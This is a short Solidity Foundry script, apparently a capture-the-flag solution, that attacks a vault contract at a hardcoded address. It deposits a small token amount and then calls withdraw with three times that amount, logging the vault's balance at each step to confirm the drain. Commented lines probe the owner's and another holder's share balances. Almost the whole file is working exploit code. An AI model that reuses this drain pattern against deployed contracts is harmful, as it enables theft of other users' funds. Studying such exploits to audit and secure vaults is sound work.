// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {IERC20} from "../src/IERC20.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

interface IVault {
    function deposit(uint256 amount) external;

    function withdraw(uint256 sharesAmount) external;

    function owner() external view returns (address);

    function token() external view returns (IERC20);

    function shares(address) external view returns (uint256);

    function totalShares() external view returns (uint256);
}

contract Kaiketsu is Script {
    function run() public {
        vm.startBroadcast();
        IVault ejiki = IVault(0x91B617B86BE27D57D8285400C5D5bAFA859dAF5F);
//        console.log(ejiki.owner());
//        console.log(ejiki.shares(ejiki.owner()));
//        console.log(ejiki.shares(0x34788137367a14f2C4D253F9a6653A93adf2D234));
//        console.log(ejiki.totalShares());
        console.log(ejiki.token().balanceOf(address(ejiki)));

        ejiki.token().approve(address (ejiki), 0.5 * 10 ** 17);
        console.log(ejiki.token().balanceOf(address(ejiki)));

        ejiki.deposit(0.5 * 10 ** 17);
        console.log(ejiki.token().balanceOf(address(ejiki)));

        ejiki.withdraw(0.5 * 10 ** 17 + 10 ** 17);
        console.log(ejiki.token().balanceOf(address(ejiki)));

//        ejiki.withdraw(ejiki.shares(0x34788137367a14f2C4D253F9a6653A93adf2D234));
//        ejiki.deposit(1 ether);
    }
}
